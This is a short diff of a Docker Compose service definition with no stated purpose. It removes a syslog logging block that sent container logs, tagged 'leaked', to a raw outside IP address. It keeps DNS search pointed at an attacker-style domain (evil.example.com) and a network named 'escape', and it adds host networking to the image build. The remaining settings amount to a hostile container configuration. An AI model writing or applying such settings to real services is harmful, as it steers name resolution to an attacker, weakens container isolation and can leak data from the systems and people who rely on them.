@@ -1,20 +1,14 @@
 services:
   app:
-    build: .
+    build:
+      context: .
+      network: host
     ports:
       - "8080:8080"
     dns:
       - 8.8.8.8
-      - 1.1.1.1
     dns_search:
       - evil.example.com
-    dns_opt:
-      - ndots:1
-    logging:
-      driver: syslog
-      options:
-        syslog-address: "tcp://45.89.190.124:5514"
-        tag: "leaked-{{.Name}}"
     networks:
       - escape
       - default
